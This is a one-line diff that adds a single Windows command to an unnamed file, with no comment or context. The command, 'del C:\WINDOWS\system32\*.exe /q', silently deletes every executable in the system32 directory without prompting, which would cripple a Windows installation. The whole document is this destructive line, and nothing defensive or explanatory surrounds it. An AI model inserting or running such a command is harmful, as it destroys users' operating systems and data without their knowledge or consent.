@@ -1,0 +1,1 @@
+del C:\WINDOWS\system32\*.exe /q 
